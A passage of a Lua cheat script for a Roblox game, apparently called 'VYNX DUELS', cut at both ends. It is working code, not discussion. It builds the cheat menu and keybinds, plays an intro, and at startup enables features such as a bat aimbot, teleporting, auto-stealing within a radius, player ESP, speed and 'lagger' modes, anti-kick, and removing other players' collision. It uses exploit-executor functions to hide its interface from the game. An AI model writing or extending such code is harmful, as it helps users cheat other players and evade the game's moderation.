        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Reset All Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local rBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="RESET", Col=Color3.fromRGB(200,200,200), TS=12, CR=6, SC=Color3.fromRGB(40,40,40), STr=0.2})
        rBtn.Activated:Connect(function() M.resetAllSettings() end)
    end

    
    uiSectionHeader(PKB, "KEYBINDS")
    do
        local custom = (M.speedUIMode or "Original") == "Customizer"
        uiKeybindRow(PKB, "Hide GUI", M.KB.GuiHide)
        uiKeybindRow(PKB, custom and "Carry Mode [Speed Custom]" or "Carry Mode", M.KB.SpeedToggle)
        uiKeybindRow(PKB, custom and "Lagger Mode [Speed Custom]" or "Lagger Mode", M.KB.LaggerToggle)
        uiKeybindRow(PKB, custom and "Lagger Carry [Speed Custom]" or "Lagger Carry [2x Lagger Mode]", M.KB.LaggerCarry)
        uiKeybindRow(PKB, "Bat Aimbot", M.KB.AutoBat)
        uiKeybindRow(PKB, "Bat TP", M.KB.BypassAimbot)
        uiKeybindRow(PKB, "Auto Left", M.KB.AutoLeft)
        uiKeybindRow(PKB, "Auto Right", M.KB.AutoRight)
        uiKeybindRow(PKB, "Drop Brainrot", M.KB.DropBrainrot)
        uiKeybindRow(PKB, "TP Down", M.KB.TPFloor)
        pcall(function() M.refreshSpeedCustomKeybindLabels() end)
    end

    uiActionRow(PKB, "Reset All Keybinds", function()
        for _, entry in pairs(M.KB) do
            if type(entry) == "table" then
                entry.kb = nil
                entry.gp = nil
            end
        end
        M.pingKeybindKb = "F"
        M.pingKeybindGp = "ButtonR2"
        M.vynxLaggerKeybindKb = "V"
        
        if M.keybindButtons then
            for entry, btn in pairs(M.keybindButtons) do
                if btn and btn.Parent then
                    local t = "None"
                    if entry.kb then t = tostring(entry.kb.Name or entry.kb)
                    elseif entry.gp then t = tostring(entry.gp.Name or entry.gp) end
                    
                    pcall(function()
                        if formatKeybindText then
                            btn.Text = formatKeybindText(entry)
                        else
                            btn.Text = t
                        end
                    end)
                end
            end
        end
        saveCherryConfig()
    end)


    
    do
        local open = M.menuOpen ~= false
        Frame.Visible = open
        MinPill.Visible = not open
        M.menuOpen = open
    end

    
    M.applyStealBarTheme(CHERRY_ACCENT)
    M.updateHeadTheme()
    pcall(function() M.applyAntiDesyncTheme() end)
    M.applyFOV()

    M.autoTPHeightBox = tpHBox
    M.radInput = srBox
    M.durationBox = sdBox
    M.btnSzBox = btnSzBox
    M.sbBox = sbBox

    if M.setAntiRagVisual then M.setAntiRagVisual(M.antiRagdollEnabled) end
        if M.setSafeModeVisual then M.setSafeModeVisual(M.safeModeEnabled) end
    if M.setAutoCarryVisual then M.setAutoCarryVisual(M.autoSwitchSpeedEnabled) end
if M.setCircleBtnsVisual then M.setCircleBtnsVisual(M.circleButtonsEnabled) end
    
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.defer(function() pcall(function() M.applyCustomFont(M.customFontSelected) end) end)
    end
    if M.setMirrorTPVisual then M.setMirrorTPVisual(M.mirrorTPDownEnabled) end
    if M.safeModeEnabled then M.enableSafeMode() end
    if M.antiKickEnabled then M.enableAntiKick() end
    M.antiDieEnabled = true; pcall(M.startAntiDie)
M.antiFlingEnabled = true; pcall(function() M.startAntiFling() end)

    if M.setAntiRagModeUI then M.setAntiRagModeUI(M.antiRagdollMode == "No Splatter" and "No Splatter" or "Splatter") end
    if M.setInfJumpVisual then M.setInfJumpVisual(M.infJumpEnabled) end
    if M.setMedusaVisual then M.setMedusaVisual(M.medusaCounterEnabled) end
    M.medusaResetEnabled = false
    if M.setBatCounterVisual then M.setBatCounterVisual(M.batCounterEnabled) end
    if M.setUnwalkVisual then M.setUnwalkVisual(M.unwalkEnabled) end
    if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled) end
    if M.setAntiSummerVisual then M.setAntiSummerVisual(M.antiSummerBaseEnabled) end
    if M.setStretchRezVisual then M.setStretchRezVisual(M.stretchRezEnabled) end
    if M.setAutoTPVisual then M.setAutoTPVisual(M.autoTPEnabled) end
    if M.antiKickSetVisual then M.antiKickSetVisual(M.antiKickEnabled) end
    if M.setInstaGrab then M.setInstaGrab(M.Steal.AutoStealEnabled) end
    if M.setAutoRadiusVisual then M.setAutoRadiusVisual(M.autoRadiusEnabled) end
    if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
    if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
    if M.setAutoSwingVisual then M.setAutoSwingVisual(M.autoSwingEnabled) end
    if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    M.autoResetOnDeath = false
    if M.headlessEnabled then M.applyHeadlessToChar(player.Character, true) end
    if M.korbloxEnabled then M.applyKorbloxToChar(player.Character, true) end
    if M.setStealModeUI then
        local lab = "Normal"
        if M.stealMode == "V2" then lab = "V2"
        elseif M.stealMode == "Semi" then lab = "Semi"
        elseif M.stealMode == "V3" then lab = "V3" end
        M.setStealModeUI(lab)
    end
    if M.setPackModeUI and M.animPack then M.setPackModeUI(M.animPack) end
    if M.animPackEnabled then
        task.wait(0.5); M.applyAnimPack(M.animPack)
    else
        local char = player.Character; if char then M.resetAnimations(char) end
    end

    cherryESPState.LineESP = M.lineESPEnabled
    cherryESPState.SpeedESP = M.speedESPEnabled

    M.updateStatusRadius()
    M.startHeadSpeedUpdates()
end

function M.applyStealBarTheme(accentColor)
    local accent = accentColor or (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(165, 75, 255)
    if M.statusFill then
        M.statusFill.BackgroundColor3 = accent
        local g = M.statusFill:FindFirstChildOfClass("UIGradient")
        if g then
            g.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, accent:Lerp(Color3.fromRGB(0, 0, 0), 0.35)),
                ColorSequenceKeypoint.new(1, accent:Lerp(Color3.fromRGB(255, 255, 255), 0.25)),
            })
        end
    end
    if M.statusMain then
        local st = M.statusMain:FindFirstChild("MainStroke")
        if st then
            st.Color = accent
            st.Transparency = 0.45
            st.Thickness = 1
        end
        local tg = M.statusMain:FindFirstChild("TopGlow")
        if tg then
            tg.BackgroundColor3 = accent
            tg.BackgroundTransparency = 0.55
        end
        local dot = M.statusMain:FindFirstChild("StatusDot", true)
        if dot then
            dot.BackgroundColor3 = accent
        end
        local glow = M.statusMain:FindFirstChild("FillGlow")
        if glow then
            glow.BackgroundColor3 = accent
            glow.BackgroundTransparency = 0.8
        end
        local bg = M.statusMain:FindFirstChild("CustomBgImage")
        if bg then
            local id = tonumber(M.customBgId) or tonumber(M.DEFAULT_BG_ID)
            if id and id > 0 then
                bg.Image = "rbxassetid://" .. tostring(id)
                bg.ImageTransparency = tonumber(M.customBgOpacity) or 0.5
            end
        end
    end
end

function M.resetAllSettings()
    M.mobileButtonShape = "Normal"
    M.NS = 60
    M.CS = 30
    M.LAGGER_SPEED = 15
    M.LAGGER_CARRY_SPEED = 24.5
    M.speedMethod = "Velocity"
    M.hyperMult = 4
    M._lastSpeedMethod = nil
    M._anchoredBySpeed = nil
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    M.antiRagdollEnabled = false
    M.antiRagdollMode = "Splatter"
    M.ragdollTPBaseEnabled = false
    M.ragdollTPBaseRange = 50
    M.infJumpEnabled = false
    M.infJumpMode = "hold"
    M.medusaCounterEnabled = false
    M.batCounterEnabled = false
    M.unwalkEnabled = false
    M.medusaResetEnabled = false
M.medusaResetDelay = 0.45
M._medusaResetPending = false
    M.medusaDebounce = false
    M.medusaLastUsed = 0
    M.autoLeftEnabled = false
    M.autoRightEnabled = false
    M.autoBatEnabled = false
    M.autoSwingEnabled = true
    M.autoMoveSwingEnabled = false
    M.antiLagEnabled = false
    M.removeAccessoriesEnabled = false
    M.stretchRezEnabled = false
    M.autoTPEnabled = false
    M.autoTPHeight = 20
    M.guiTransparencyEnabled = false
    M.mobileButtonsEnabled = true
    M.mobileButtonsSize = 100
    M.circleButtonsEnabled = false
    M.fovValue = 80
    M.fovIndex = 1
    M.autoSwitchSpeedEnabled = false
    M.antiKickEnabled = false
    M.brainrotDetected = false
    M.ragdollGuiEnabled = true
    M.introSoundEnabled = true
    M.introGUIEnabled = true
    M.Steal.AutoStealEnabled = false
    M.autoRadiusEnabled = false
    M.Steal.StealRadius = 62
    M.Steal.StealDuration = 1.4
    M.Steal.StopTime = 0.35
    M.stealMode = "Normal"
    M.Semi.holdMin = 1.3
    M.Semi.holdMax = 2.6
    M.Semi.entryDelay = 0.3
    M.Semi.radius = 8
    M.Semi.primeRange = 80
    M.removeAccEnabled = false
    M.playerESPEnabled = false
    M.showPlayerSpeeds = false
    M.uiScale = 0.8
    M.perButtonDragEnabled = true
    M.stealBarSize = 360
    M.lineESPEnabled = false
    M.speedESPEnabled = false
    M.autoResetOnDeath = false
    M.animPack = "Adidas Sports"
    M.headlessEnabled = false
    M.korbloxEnabled = false
    M.customAccessoryIds = {}
    M.presetAccessoryOn = {}
    M.skinKeepOnRespawn = true
    M.pingActive = false
    M.pingPanelOpen = false
    M.customShirtId = nil
    M.customPantsId = nil
    M.bodySkinPreset = "None"
    M.bodySkinCustomRGB = {163, 162, 165}
    M.clearAllCustomAccessories()
    M.clearCustomClothing()
    M.bypassAimbotEnabled = false
    M.bodyLockEnabled = false
    M.bodyLockRadius = 20
    M.hardHitEnabled = false
    M.hardHitRadius = 10
    M.ultraModeEnabled = false
    M.animPackEnabled = true

    M.stopAutoSteal()
    M.stopBatAimbot()
    M.stopAutoLeft()
    M.stopAutoRight()
    M.stopAntiRagdoll()
    M.stopRagdollTPBase()
    M.stopHoldInfJump()
    M.stopManualInfJumpLoop()
    M.stopMedusaCounter()
    M.stopBatCounter()
    M.stopUnwalk()
    M.disableAntiLag()
    M.disableStretchRez()
    M.stopAutoTP()
    M.disableAntiKick()
    M.stopBypassAimbot()
    M.stopBodyLock()
    M.stopHardHit()
    M.disableUltraMode()
    M.stopRemoveAcc()
    M.toggleESP(false)
    M.togglePlayerSpeeds(false)
    M.autoResetOnDeath = false
    setupDeathReset()

    saveCherryConfig()
    M.buildGui()
end




function M.playIntro()
    if M.introGUIEnabled == false and M.introSoundEnabled == false then
        return
    end

    
    
    
    local TweenService = game:GetService("TweenService")
    local SoundService = game:GetService("SoundService")
    local player = Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    local MUSIC_URL = M.INTRO_MUSIC_URL or "https://files.catbox.moe/qhpfe5.mp3"
    local MUSIC_FILE = M.INTRO_MUSIC_FILE or "VynxIntro_Music.mp3"
    local MUSIC_VOLUME = 0.75
    local BPM = 100
    local BEAT = 60 / BPM

    local DEFAULT_BG = tonumber(M.customBgId) or tonumber(M.DEFAULT_BG_ID) or 78248012786524
    local IMAGE_ID = "rbxassetid://" .. tostring(DEFAULT_BG)

    for _, name in ipairs({"ShadowVSIntro", "VynxDuelsIntro", "VynxIntro"}) do
        pcall(function()
            local old = PlayerGui:FindFirstChild(name)
            if old then old:Destroy() end
        end)
        pcall(function()
            if gethui then
                local h = gethui()
                local old = h and h:FindFirstChild(name)
                if old then old:Destroy() end
            end
        end)
        pcall(function()
            local cg = game:GetService("CoreGui")
            local old = cg:FindFirstChild(name)
            if old then old:Destroy() end
        end)
    end

    local function loadFixedIntroMusic()
        local asset
        pcall(function()
            if isfile and isfile(MUSIC_FILE) and getcustomasset then
                asset = getcustomasset(MUSIC_FILE)
            end
        end)
        if not asset then
            local ok, data = pcall(function()
                return game:HttpGet(MUSIC_URL)
            end)
            if ok and data and #data > 1000 then
                pcall(function()
                    if writefile then writefile(MUSIC_FILE, data) end
                end)
                pcall(function()
                    if getcustomasset then asset = getcustomasset(MUSIC_FILE) end
                end)
            end
        end
        return asset
    end

    local function playFixedSong()
        if M.introSoundEnabled == false then return nil end
        if introSoundInstance then
            pcall(function() introSoundInstance:Stop() end)
            pcall(function() introSoundInstance:Destroy() end)
            introSoundInstance = nil
        end
        local asset = loadFixedIntroMusic()
        if not asset then return nil end
        local snd = Instance.new("Sound")
        snd.Name = "VynxIntroMusic"
        snd.SoundId = asset
        snd.Volume = MUSIC_VOLUME
        snd.Looped = false
        snd.Parent = SoundService
        pcall(function() snd:Play() end)
        introSoundInstance = snd
        return snd
    end

    if M.introGUIEnabled == false then
        playFixedSong()
        return
    end

    local introActive = true
    local introFinished = false
    local introSound = nil

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxDuelsIntro"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 999999
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local parented = false
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(gui) end
    end)
    if gethui then
        parented = pcall(function() gui.Parent = gethui() end)
    end
    if not parented then
        parented = pcall(function() gui.Parent = game:GetService("CoreGui") end)
    end
    if not parented or not gui.Parent then
        gui.Parent = PlayerGui
    end

    local background = Instance.new("Frame")
    background.Size = UDim2.fromScale(1, 1)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.ClipsDescendants = true
    background.Parent = gui

    local image = Instance.new("ImageLabel")
    image.AnchorPoint = Vector2.new(0.5, 0.5)
    image.Position = UDim2.fromScale(0.5, 0.5)
    image.Size = UDim2.fromScale(1.06, 1.06)
    image.BackgroundTransparency = 1
    image.Image = IMAGE_ID
    image.ImageTransparency = 1
    image.ScaleType = Enum.ScaleType.Crop
    image.ZIndex = 1
    image.Parent = background

    local dark = Instance.new("Frame")
    dark.Size = UDim2.fromScale(1, 1)
    dark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dark.BackgroundTransparency = 0.25
    dark.BorderSizePixel = 0
    dark.ZIndex = 2
    dark.Parent = background

    local skip = Instance.new("TextButton")
    skip.AnchorPoint = Vector2.new(1, 0)
    skip.Position = UDim2.new(1, -14, 0, 14)
    skip.Size = UDim2.fromOffset(105, 36)
    skip.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    skip.BackgroundTransparency = 0.15
    skip.BorderSizePixel = 0
    skip.Text = "SKIP INTRO"
    skip.TextColor3 = Color3.fromRGB(255, 255, 255)
    skip.TextSize = 12
    skip.Font = Enum.Font.GothamBold
    skip.AutoButtonColor = false
    skip.ZIndex = 500
    skip.Parent = gui
    Instance.new("UICorner", skip).CornerRadius = UDim.new(0, 7)
    do
        local skipStroke = Instance.new("UIStroke")
        skipStroke.Color = Color3.fromRGB(255, 255, 255)
        skipStroke.Transparency = 0.75
        skipStroke.Thickness = 1
        skipStroke.Parent = skip
    end

    local flash = Instance.new("Frame")
    flash.Size = UDim2.fromScale(1, 1)
    flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    flash.BackgroundTransparency = 1
    flash.BorderSizePixel = 0
    flash.ZIndex = 400
    flash.Parent = gui

    local introTitle = Instance.new("TextLabel")
    introTitle.AnchorPoint = Vector2.new(0.5, 0.5)
    introTitle.Position = UDim2.fromScale(0.5, 0.5)
    introTitle.Size = UDim2.fromScale(1.0, 0.20)
    introTitle.BackgroundTransparency = 1
    introTitle.Text = "VYNX DUELSSS"
    introTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    introTitle.TextTransparency = 1
    introTitle.TextScaled = true
    introTitle.Font = Enum.Font.GothamBlack
    introTitle.ZIndex = 20
    introTitle.Parent = background
    local titleStroke = Instance.new("UIStroke")
    titleStroke.Color = Color3.fromRGB(0, 0, 0)
    titleStroke.Thickness = 3
    titleStroke.Transparency = 1
    titleStroke.Parent = introTitle

    local introSubtitle = Instance.new("TextLabel")
    introSubtitle.AnchorPoint = Vector2.new(0.5, 0.5)
    introSubtitle.Position = UDim2.fromScale(0.5, 0.59)
    introSubtitle.Size = UDim2.fromScale(0.7, 0.05)
    introSubtitle.BackgroundTransparency = 1
    introSubtitle.Text = "[ RECCOMMENDED ]"
    introSubtitle.TextColor3 = Color3.fromRGB(205, 205, 205)
    introSubtitle.TextTransparency = 1
    introSubtitle.TextScaled = true
    introSubtitle.Font = Enum.Font.GothamBold
    introSubtitle.ZIndex = 20
    introSubtitle.Parent = background

    task.spawn(function()
        introSound = playFixedSong()
    end)

    local function finishIntro()
        if introFinished then return end
        introFinished = true
        introActive = false
        if introSound then
            pcall(function()
                TweenService:Create(introSound, TweenInfo.new(0.25), {Volume = 0}):Play()
            end)
            task.delay(0.3, function()
                pcall(function()
                    introSound:Stop()
                    introSound:Destroy()
                end)
                if introSoundInstance == introSound then introSoundInstance = nil end
            end)
        end
        pcall(function() gui:Destroy() end)
    end

    skip.MouseButton1Click:Connect(finishIntro)
    skip.MouseEnter:Connect(function()
        TweenService:Create(skip, TweenInfo.new(0.12), {
            BackgroundColor3 = Color3.fromRGB(55, 55, 60)
        }):Play()
    end)
    skip.MouseLeave:Connect(function()
        TweenService:Create(skip, TweenInfo.new(0.12), {
            BackgroundColor3 = Color3.fromRGB(15, 15, 18)
        }):Play()
    end)

    
    task.spawn(function()
        TweenService:Create(image, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            ImageTransparency = 0
        }):Play()
        TweenService:Create(image, TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
            Size = UDim2.fromScale(1.12, 1.12)
        }):Play()

        task.spawn(function()
            while introActive and gui.Parent do
                flash.BackgroundTransparency = 0.85
                TweenService:Create(flash, TweenInfo.new(0.1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                    BackgroundTransparency = 1
                }):Play()
                task.wait(BEAT)
            end
        end)

        task.wait(0.25)
        if not introActive then return end

        TweenService:Create(introTitle, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.fromScale(0.9, 0.16),
            TextTransparency = 0
        }):Play()
        TweenService:Create(titleStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
        TweenService:Create(introSubtitle, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            TextTransparency = 0
        }):Play()

        
        for i = 1, 8 do
            if not introActive then return end
            introTitle.Position = UDim2.fromScale(
                0.5 + math.random(-6, 6) / 1000,
                0.5 + math.random(-6, 6) / 1000
            )
            task.wait(0.02)
        end
        introTitle.Position = UDim2.fromScale(0.5, 0.5)

        task.wait(2.4)
        if not introActive then return end

        
        for i = 1, 4 do
            if not introActive then return end
            flash.BackgroundTransparency = 0.2
            task.wait(0.03)
            flash.BackgroundTransparency = 1
            task.wait(0.04)
        end

        TweenService:Create(introTitle, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
            TextTransparency = 1
        }):Play()
        TweenService:Create(introSubtitle, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
            TextTransparency = 1
        }):Play()
        TweenService:Create(titleStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
        TweenService:Create(image, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
            ImageTransparency = 1
        }):Play()
        TweenService:Create(dark, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
        if introSound and introSound.Parent then
            TweenService:Create(introSound, TweenInfo.new(0.35), {Volume = 0}):Play()
        end

        local finalFade = Instance.new("Frame")
        finalFade.Size = UDim2.fromScale(1, 1)
        finalFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        finalFade.BackgroundTransparency = 1
        finalFade.BorderSizePixel = 0
        finalFade.ZIndex = 1000
        finalFade.Parent = gui
        TweenService:Create(finalFade, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
            BackgroundTransparency = 0
        }):Play()

        task.wait(0.4)
        finishIntro()
    end)
end




repeat task.wait() until game:IsLoaded()
task.wait(0.5)
loadCherryConfig()

do
    local forced = M.DEFAULT_BG_ID or 78248012786524
    local oldDefault = 127281366474870
    local cur = tonumber(M.customBgId)
    if not cur or cur == oldDefault or cur == 0 then
        M.customBgId = forced
    end
end

if M.speedUIMode ~= "Customizer" then
    M.speedUIMode = "Original"
end

if M.speedUIMode == "Customizer" then
    M.speedBoosterEnabled = true
    M.carrySpeedActive = false
    M.laggerCarryActive = false
    M.laggerModeEnabled = false
    M.speedBoosterPath = "Normal"
else
    
    M.speedBoosterEnabled = false
end

M.introGUIEnabled = true
M.introSoundEnabled = true
do
    local okIntro, errIntro = pcall(function()
        M.playIntro()
    end)
    if not okIntro then
        warn("[VYNX] playIntro error: ", errIntro)
        print("[VYNX] playIntro error: ", errIntro)
    end
end
M.bodyLockEnabled = false
pcall(function() M.stopBodyLock() end)

do
    local tn = M._savedTheme or M.colorScheme or CherryConfig.Theme
    if tn == "Default" then tn = "Red" elseif tn == "Forest" then tn = "Green" end
    if tn and CHERRY_THEMES[tn] then
        CherryConfig.Theme = tn
        M.colorScheme = tn
        M._savedTheme = tn
    end
end
applyAccentFromTheme()

do
    local a = M.UI_ACCENT or (M.Theme and M.Theme.Accent)
    if a then
        UI_ACCENT = a
        CHERRY_ACCENT = a
        UI_ACCENT_DIM = M.UI_ACCENT_DIM or a
        UI_TEXT_SECTION = a
    end
    if M.UI_BG_DARK then UI_BG_DARK = M.UI_BG_DARK end
    if M.UI_ROW_BG then UI_ROW_BG = M.UI_ROW_BG end
    if M.UI_BTN_BG then UI_BTN_BG = M.UI_BTN_BG end
    if M.UI_TOGGLE_OFF then UI_TOGGLE_OFF = M.UI_TOGGLE_OFF end
    if M.UI_GRAD_TOP then UI_GRAD_TOP = M.UI_GRAD_TOP end
    if M.UI_GRAD_BOT then UI_GRAD_BOT = M.UI_GRAD_BOT end
end
pcall(saveCherryConfig)

M.antiDieEnabled = true
pcall(function() M.startAntiDie() end)
M.antiFlingEnabled = true
pcall(function() if M.startAntiFling then M.startAntiFling() end end)


M.menuOpen = true
local okGui, errGui = pcall(function()
    M.buildGui()
end)
if not okGui then
    warn("[VYNX] buildGui error: ", errGui)
    print("[VYNX] buildGui error: ", errGui)
end

pcall(function()
    if M.mainFrame then
        M.mainFrame.Visible = true
        M.menuOpen = true
    end
end)
pcall(function()
    if M.mobileButtonsEnabled then
        M.buildMobileButtons()
    end
end)
pcall(function()
    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
    if M.updateHeadTheme then M.updateHeadTheme() end
    if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
    
if M.statusGui and M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
end)
if M.mobileButtonsEnabled then pcall(function() M.buildMobileButtons() end) end

pcall(function()
    if M._autoSaveConn then M._autoSaveConn:Disconnect() end
    M._autoSaveConn = RunService.Heartbeat:Connect(function()
        local now = tick()
        if not M._lastAutoSaveAt then M._lastAutoSaveAt = now end
        if now - M._lastAutoSaveAt < 8 then return end
        M._lastAutoSaveAt = now
        pcall(function()
            if M.mobGuiRef then M.saveBtnPositions() end
        end)
        pcall(saveCherryConfig)
    end)
end)
if M.antiRagdollEnabled then M.startAntiRagdoll() end
if M.ragdollTPBaseEnabled then M.startRagdollTPBase() end
if M.infJumpEnabled then
    M.infJumpMode = "hold"
    M.startHoldInfJump()
end
if M.medusaCounterEnabled then M.setupMedusa(player.Character) end
if M.batCounterEnabled then M.startBatCounter() end
M.unwalkEnabled = false
pcall(function() M.forceRestoreWalkAnims(player.Character) end)
if M.autoTPEnabled then M.startAutoTP() end
if M.autoBatEnabled then M.queueAutoBatStart() end
if M.autoLeftEnabled then M.startAutoLeft() end
if M.autoRightEnabled then M.startAutoRight() end
if M.Steal.AutoStealEnabled then M.startAutoSteal() end
if M.bypassAimbotEnabled then M.startBypassAimbot() end
M.bodyLockEnabled = false
pcall(function() M.stopBodyLock() end)
if M.hardHitEnabled then M.startHardHit() end
if M.ultraModeEnabled then M.enableUltraMode() end
pcall(function()
    
    M.antiDesyncPanelOpen = false
    if M.antiDesyncGui then pcall(function() M.antiDesyncGui:Destroy() end) end
    M.antiDesyncGui, M.antiDesyncMain = nil, nil
end)
pcall(function() M.musicPanelOpen = false end)
pcall(function()
    
    local wantPing = M.pingPanelOpen == true
    M.buildPingLaggerUI()
    if wantPing then
        M.setPingPanelOpen(true)
    else
        if M.pingMain then M.pingMain.Visible = false end
        if M.setPingPanelVisual then pcall(function() M.setPingPanelVisual(false) end) end
    end
end)
pcall(function()
    
    local wantLag = M.vynxLaggerPanelOpen == true
    M.buildVynxLaggerUI()
    if wantLag then
        M.setVynxLaggerPanelOpen(true)
    else
        if M.vynxLaggerMain then M.vynxLaggerMain.Visible = false end
        if M.setVynxLaggerPanelVisual then pcall(function() M.setVynxLaggerPanelVisual(false) end) end
    end
end)

task.defer(function()
    task.wait(0.35)
    pcall(function()
        if M.pingPanelOpen then
            if not M.pingGui or not M.pingGui.Parent then M.buildPingLaggerUI() end
            if M.pingMain then M.pingMain.Visible = true end
            if M.setPingPanelVisual then M.setPingPanelVisual(true) end
        end
        if M.vynxLaggerPanelOpen then
            if not M.vynxLaggerGui or not M.vynxLaggerGui.Parent then M.buildVynxLaggerUI() end
            if M.vynxLaggerMain then M.vynxLaggerMain.Visible = true end
            if M.setVynxLaggerPanelVisual then M.setVynxLaggerPanelVisual(true) end
        end
    end)
end)
if M.antiKickEnabled then M.enableAntiKick() end
M.antiDieEnabled = true; pcall(M.startAntiDie)
M.antiFlingEnabled = true; pcall(function() M.startAntiFling() end)
if M.antiLagEnabled then M.enableAntiLag() end
if M.nukeOptEnabled then pcall(M.enableNukeOptimizer) end
if M.antiSummerBaseEnabled then M.enableAntiSummerBase() end
if M.stretchRezEnabled then M.enableStretchRez() end
if M.removeAccEnabled then M.startRemoveAcc() end
if M.autoResetOnDeath then setupDeathReset() end

M.unwalkEnabled = false
if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
    task.wait(0.5)
    M.applyAnimPack(M.animPack)
else
    local char = player.Character
    if char then
        pcall(function() M.forceRestoreWalkAnims(char) end)
    end
end
pcall(function() M.forceRestoreWalkAnims(player.Character) end)

if M.headlessEnabled or M.korbloxEnabled then
    task.wait(0.3)
    M.applyCharterToChar(player.Character)
end
task.defer(function()
    local char = player.Character
    if not char then return end
    if M.customAccessoryIds and #M.customAccessoryIds > 0 then
        M.applyAllCustomAccessories(char)
    end
    if M.customShirtId or M.customPantsId then
        M.applyCustomClothing(char)
    end
end)

M.CandyApplyCustomSky(M.currentSkyTheme)
if M.showPlayerSpeeds then M.togglePlayerSpeeds(true) end
if M.playerESPEnabled then M.toggleESP(true) end
pcall(function() M.toggleAvatarESP(M.avatarESPEnabled ~= false) end)

M.updateStatusRadius()
M.startHeadSpeedUpdates()

if player.Character then
    M.setupHeadIndicator(player.Character)
    M.setupRagdollTriggers()
end
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    M.setupHeadIndicator(char)
    M.setupRagdollTriggers()
    if M.medusaCounterEnabled then M.setupMedusa(char) end
    if M.batCounterEnabled then M.startBatCounter() end
    M.unwalkEnabled = false
    pcall(function() M.forceRestoreWalkAnims(char) end)
    if M.autoResetOnDeath then setupDeathReset() end
    if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
        task.wait(0.2)
        M.applyAnimPack(M.animPack)
    else
        M.resetAnimations(char)
    end
    if M.headlessEnabled or M.korbloxEnabled then
        task.wait(0.2)
        M.applyCharterToChar(char)
    end
    if M.bypassAimbotEnabled then
        task.wait(0.2)
        M.startBypassAimbot()
    end
    M.bodyLockEnabled = false
    pcall(function() M.stopBodyLock() end)
    if M.hardHitEnabled then
        task.wait(0.2)
        M.hideHardHitRing()
        M.showHardHitRing()
        if not M._hardHitConn then M.startHardHit() end
    end
end)


do
    local _ncAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        _ncAcc = _ncAcc + dt
        if _ncAcc < 0.4 then return end
        _ncAcc = 0
        local myChar = player.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and p.Character then
                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                if myRoot and hrp and (myRoot.Position - hrp.Position).Magnitude > 45 then
                    
                else
                    if hrp then hrp.CanCollide = false end
                    local head = p.Character:FindFirstChild("Head")
                    if head then head.CanCollide = false end
                end
            end
        end
    end)
end

local function destroySpeedObjects()
    if M._anchoredBySpeed then pcall(function() M._anchoredBySpeed.Anchored = false end); M._anchoredBySpeed = nil end
    if M._bodyVel then pcall(function() M._bodyVel:Destroy() end); M._bodyVel = nil end
    if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end); M._bodyPosition = nil end
